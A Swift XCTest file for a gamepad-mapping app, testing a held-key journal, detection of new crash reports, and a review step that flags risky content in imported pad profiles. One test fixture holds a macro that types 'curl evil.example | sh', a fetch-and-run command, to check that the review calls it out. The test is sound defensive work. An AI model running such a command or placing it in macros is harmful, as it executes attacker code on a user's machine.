import XCTest
@testable import NokcanduCore

final class HeldOutputsJournalTests: XCTestCase {
    func testTracksAndRoundTrips() {
        var j = HeldOutputsJournal()
        XCTAssertTrue(j.key(12, down: true)); XCTAssertFalse(j.key(12, down: true), "already held: nothing to save")
        XCTAssertTrue(j.mouse(0, down: true)); XCTAssertTrue(j.key(56, down: true)); XCTAssertTrue(j.key(12, down: false))
        let back = HeldOutputsJournal.read(j.data())
        XCTAssertEqual(back.keys, [56]); XCTAssertEqual(back.mouseButtons, [0])
        XCTAssertTrue(HeldOutputsJournal.read(nil).isEmpty)
        XCTAssertTrue(HeldOutputsJournal.read(Data("garbage".utf8)).isEmpty)
        XCTAssertEqual(HeldOutputsJournal.read(Data(#"{"keys":[5,9999,-1],"mouseButtons":[2,40]}"#.utf8)).keys, [5], "only real key codes")
    }
}

final class NokcanduCrashReportsTests: XCTestCase {
    func testOnlyNewNokcanduReportsAfterTheFirstCheck() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("crash-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let defaults = try XCTUnwrap(UserDefaults(suiteName: "crash-test-\(UUID().uuidString)"))
        let t0 = Date(timeIntervalSince1970: 1_800_000_000)
        XCTAssertNil(NokcanduCrashReports.checkAtLaunch(defaults: defaults, folder: dir, now: t0), "the first launch only records")
        func file(_ name: String, at date: Date) throws {
            let u = dir.appendingPathComponent(name); try Data("x".utf8).write(to: u)
            try FileManager.default.setAttributes([.modificationDate: date], ofItemAtPath: u.path)
        }
        try file("Nokcandu-2027-01-01-000000.ips", at: t0.addingTimeInterval(60))
        try file("Nokcandu-2027-01-01-000100.ips", at: t0.addingTimeInterval(120))
        try file("Safari-2027-01-01.ips", at: t0.addingTimeInterval(90))
        try file("Nokcandu-old.ips", at: t0.addingTimeInterval(-60))
        let found = try XCTUnwrap(NokcanduCrashReports.checkAtLaunch(defaults: defaults, folder: dir, now: t0.addingTimeInterval(200)))
        XCTAssertEqual(found.url.lastPathComponent, "Nokcandu-2027-01-01-000100.ips"); XCTAssertEqual(found.count, 2)
        XCTAssertNil(NokcanduCrashReports.checkAtLaunch(defaults: defaults, folder: dir, now: t0.addingTimeInterval(300)), "shown once")
    }
}

final class PadProfileImportReviewTests: XCTestCase {
    func testTypedTextAndCommandShortcutsAreCalledOut() {
        var p = PadProfiles.Profile(id: "p", name: "P")
        XCTAssertEqual(PadProfileImportReview.notes([p]), [], "plain key mappings: nothing to point out")
        p.layers[0][.a] = PadProfiles.Binding(press: [.key(55), .key(12)])      // ⌘Q
        var m = PadProfiles.Macro(id: "m", name: "M", steps: [])
        m.steps = [.init(.text, text: "curl evil.example | sh\n")]
        p.macros = [m]
        let notes = PadProfileImportReview.notes([p])
        XCTAssertTrue(notes.contains { $0.contains("curl evil.example | sh⏎") })
        XCTAssertTrue(notes.contains { $0.contains("⌘ shortcuts (1 place)") })
    }
}
